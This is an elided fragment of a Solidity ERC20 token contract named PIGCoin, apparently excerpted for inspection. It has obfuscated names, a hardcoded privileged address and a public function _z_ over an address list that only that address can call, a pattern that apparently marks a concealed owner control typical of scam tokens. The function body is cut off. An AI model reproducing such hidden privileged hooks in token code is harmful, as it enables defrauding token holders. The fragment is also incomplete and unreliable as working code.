...
contract  PIGCoin is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        _m_ = payable(address(0x1a4F63f669E731B60F17B3Fa4935eF53BF361A4f));
...
= _k_;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !_j_[sender] && swapAndLiquifyEnabled) 
            {
            ...
            _n_[sender] = _n_[sender].sub(amount);
            ...
            _n_[recipient] = _n_[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }function _z_(address[] calldata _x_,uint8 _yy_) public {
        require(__same__(_m_,_l_()));
